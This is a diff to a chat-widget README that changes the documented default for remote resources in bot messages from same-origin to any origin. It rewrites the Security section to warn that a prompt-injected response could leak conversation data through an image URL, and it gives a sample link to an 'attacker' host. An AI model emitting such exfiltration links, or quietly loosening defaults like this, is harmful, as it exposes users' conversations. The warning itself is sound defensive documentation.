@@ -196,7 +196,7 @@ Your assistant will appear as an elegant chat widget on your page:
 | `hideCloseButton`       | `boolean`             | Whether to hide close button. By default `false`.                                                |
 | `fullScreen`            | `boolean`             | Whether to open chat in full screen. By default `false`.                                         |
 | `open`                  | `boolean`             | Whether to open chat on page load. By default `false`.                                           |
-| `allowedResourceOrigins` | `string[]`          | Origins that bot messages may load images and chart data from. Same-origin and `data:` URLs are always allowed; `['*']` allows any origin. By default only same-origin. |
+| `allowedResourceOrigins` | `string[]`          | Origins that bot messages may load images and chart data from. Same-origin and `data:` URLs are always allowed; `['*']` allows any origin. By default `['*']`. Recommended: `[]` or a list of trusted origins (see [Security](#-security)). |
 
 ### Events
 
@@ -227,7 +227,7 @@ With the vanilla widget you can also call `widget.clearHistory()`, which additio
 
 - **The endpoint is public.** With Endpoint Authorization disabled, anyone who finds the API URL in your page can call the agent directly. Don't put secrets in `api.headers`, since they are shipped to every visitor. For production, consider proxying requests through your own backend, which can authenticate users and apply rate limits.
 - **Bot messages are sanitized.** Markdown from the agent is rendered through DOMPurify, links only allow `http(s)`/`mailto` and open in a new tab, and charts run without `eval` (compatible with a CSP that has no `'unsafe-eval'`).
-- **Remote resources are blocked by default.** Images and chart data in bot messages are only loaded from your own origin unless you list other origins in `allowedResourceOrigins`. This stops a prompt-injected response from leaking conversation data through an image URL.
+- **Restrict remote resources.** By default, images and chart data in bot messages may load from any origin. A prompt-injected response could use that to leak conversation data through an image URL (e.g. `![](https://attacker/?q=...)`). Set `allowedResourceOrigins` to `[]` (same-origin only) or to the origins your agent really uses. `url()` references in inline styles and SVG attributes, and `srcset`, are always removed.
 - **Your own HTML options are not sanitized.** `title`, `footerText`, `poweredBy`, `humanSupport` and `prompts[].icon` are inserted as HTML. Only pass trusted content.
 
 ## 🤝 Contributing
